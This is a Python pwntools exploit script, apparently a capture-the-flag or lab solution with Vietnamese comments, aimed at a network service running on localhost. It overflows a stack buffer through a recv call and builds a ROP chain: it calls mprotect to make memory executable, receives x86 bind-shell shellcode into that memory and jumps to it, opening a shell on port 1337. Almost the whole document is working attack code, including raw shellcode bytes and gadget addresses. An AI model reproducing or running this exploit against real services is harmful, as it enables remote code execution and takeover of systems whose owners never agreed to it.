#chạy shell kết nối đến 127.0.0.1:1337
#----------------------------------
#lỗi xãy ra ở hàm recv thứ 2, cho phép ta ghi đè lên stack một lượng ký tự tùy ý
#-> ta có thể control EIP, khiến nó thực hiện ROP ta đã tạo ra
#ROP có dạng:
#	gọi hàm mprotect để thay đổi quyền của 1 vùng nhớ chỉ định thành quyền rwx. khi đó, nếu shellcode được ghi tại vùng nhớ này sẽ có thể được thực thi mặc dù chương trình có bật NX
#	gọi hàm recv nhận shellcode từ socket rồi ghi vào vùng nhớ có quyền rwx bên trên
#	nhảy đến đầu shellcode để chạy nó

from pwn import *
import time

shell = "\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"

payload = "QUIT" + 'a'*39
payload += p32(0x080486B0)		#địa chỉ hàm mprotect
payload += p32(0x0804907d)    # pop esi; pop edi; pop ebp; ret; 
payload += p32(0x0804b000)    # address vùng nhớ 
payload += p32(0x100)         # size 
payload += p32(0x07)          # rwx

payload += p32(0x08048820)		#địa chỉ hàm recv
payload += p32(0x0804907c)    # pop esi; pop edi; pop ebp; pop eax; ret; 
payload += p32(0x04)           # sockfd
payload += p32(0x0804b000)    # địa chỉ để ghi vào
payload += p32(0x100)         # size
payload += p32(0x00)			

payload += p32(0x0804b002)    # return to shellcode
payload += p32(0x90)

r = remote("localhost", 1234)
time.sleep(1)
r.sendline(p32(len(payload)))
#time.sleep(1)
r.sendline(payload)
#time.sleep(1)
r.sendline(shell)
time.sleep(2)
r.interactive() 